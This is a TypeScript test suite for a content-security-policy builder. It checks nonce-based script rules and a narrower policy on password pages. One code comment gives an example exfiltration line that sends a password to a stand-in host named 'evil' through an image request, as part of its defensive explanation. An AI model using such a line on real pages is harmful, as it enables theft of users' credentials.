import { describe, expect, it } from 'vitest';

import { buildContentSecurityPolicy, generateNonce } from './content-security-policy';

const build = (isDevelopment: boolean, realtimeUrl?: string) =>
  buildContentSecurityPolicy({ nonce: 'TESTNONCE', realtimeUrl, isDevelopment });

describe('buildContentSecurityPolicy', () => {
  it('authorises scripts by nonce, never by unsafe-inline', () => {
    const policy = build(false);
    expect(policy).toContain("script-src 'self' 'nonce-TESTNONCE' 'strict-dynamic'");
    expect(policy).not.toContain("script-src 'self' 'unsafe-inline'");
  });

  it('never permits unsafe-eval in production', () => {
    expect(build(false)).not.toContain('unsafe-eval');
  });

  it('permits unsafe-eval in development only, for the dev runtime', () => {
    expect(build(true)).toContain('unsafe-eval');
  });

  it('blocks framing and plugins outright', () => {
    const policy = build(false);
    expect(policy).toContain("frame-ancestors 'none'");
    expect(policy).toContain("object-src 'none'");
  });

  it('pins base-uri, so an injected <base> cannot repoint relative URLs', () => {
    expect(build(false)).toContain("base-uri 'self'");
  });

  it('allows the realtime gateway over both https and wss', () => {
    const policy = build(false, 'https://dev.gotcha.co.il');
    expect(policy).toContain('https://dev.gotcha.co.il');
    expect(policy).toContain('wss://dev.gotcha.co.il');
  });

  it('omits realtime origins entirely when none is configured', () => {
    expect(build(false)).toContain("connect-src 'self';");
  });

  it('upgrades insecure requests in production only', () => {
    expect(build(false)).toContain('upgrade-insecure-requests');
    expect(build(true)).not.toContain('upgrade-insecure-requests');
  });
});

describe('generateNonce', () => {
  it('produces a fresh value every call', () => {
    const values = new Set(Array.from({ length: 50 }, generateNonce));
    expect(values.size).toBe(50);
  });

  it('produces enough entropy to be unguessable', () => {
    // 16 random bytes base64-encoded.
    expect(generateNonce()).toHaveLength(24);
  });
});

describe('★★ a page where somebody types a password gets a narrower policy', () => {
  const policy = (credentialSurface: boolean) =>
    buildContentSecurityPolicy({
      nonce: 'n',
      realtimeUrl: 'https://realtime.gotcha.co.il',
      isDevelopment: false,
      credentialSurface,
    });

  /** The directives, parsed, so an assertion cannot pass on a substring. */
  const directive = (csp: string, name: string): string[] => {
    const found = csp
      .split('; ')
      .map((part) => part.split(' '))
      .find((parts) => parts[0] === name);
    return found ? found.slice(1) : [];
  };

  it('★★ drops the `https:` wildcard from img-src, which is an exfiltration channel', () => {
    /*
     * ════════════════════════════════════════════════════════════════════════
     * THE ONE THAT MATTERS, AND THE ONE THAT LOOKS HARMLESS
     * ════════════════════════════════════════════════════════════════════════
     * `new Image().src = 'https://evil/?p=' + password` carries the value off the
     * page over a channel `connect-src` does not govern. The general policy
     * allows `https:` because a merchant's product photos come from wherever
     * their shop hosts them; **the sign-in screen renders none of that** — its
     * only image is an inline SVG — so the wildcard buys nothing there.
     */
    expect(directive(policy(true), 'img-src')).toEqual(["'self'", 'data:']);
    expect(directive(policy(false), 'img-src')).toContain('https:');
  });

  it('★★ closes media-src and frame-src, which are the same channel in other tags', () => {
    expect(directive(policy(true), 'media-src')).toEqual(["'none'"]);
    expect(directive(policy(true), 'frame-src')).toEqual(["'none'"]);
  });

  it('★★ drops the realtime origins, which nothing uses before sign-in', () => {
    /*
     * Every extra origin in `connect-src` is a destination an injected script may
     * post to. Realtime is not reachable to somebody who has not authenticated,
     * so it is pure surface on this route.
     */
    expect(directive(policy(true), 'connect-src')).toEqual(["'self'"]);
    expect(directive(policy(false), 'connect-src')).toContain('https://realtime.gotcha.co.il');
  });

  it('★★ keeps the executor reachable, or the panel cannot sign anybody in', () => {
    /*
     * The narrowing must not break the thing it protects. The flow executor is
     * same-origin through the gateway's `/v2/auth-api/` proxy, so `'self'`
     * covers it — which is another reason that proxy is better than CORS.
     */
    expect(directive(policy(true), 'connect-src')).toContain("'self'");
  });

  it('★★ keeps the nonce and strict-dynamic, which are what make any of this work', () => {
    /*
     * A narrower policy that lost the script rules would be a downgrade wearing
     * the clothes of an upgrade. Both policies keep them.
     */
    for (const csp of [policy(true), policy(false)]) {
      expect(directive(csp, 'script-src')).toContain("'nonce-n'");
      expect(directive(csp, 'script-src')).toContain("'strict-dynamic'");
      expect(directive(csp, 'object-src')).toEqual(["'none'"]);
      expect(directive(csp, 'base-uri')).toEqual(["'self'"]);
      expect(directive(csp, 'form-action')).toEqual(["'self'"]);
      expect(directive(csp, 'frame-ancestors')).toEqual(["'none'"]);
    }
  });

  it('★ leaves every other route exactly as it was', () => {
    // The app renders customer photos all day. A narrowing that leaked into the
    // rest of the product would break avatars and look like a backend failure.
    expect(policy(false)).toBe(
      buildContentSecurityPolicy({
        nonce: 'n',
        realtimeUrl: 'https://realtime.gotcha.co.il',
        isDevelopment: false,
      }),
    );
  });
});
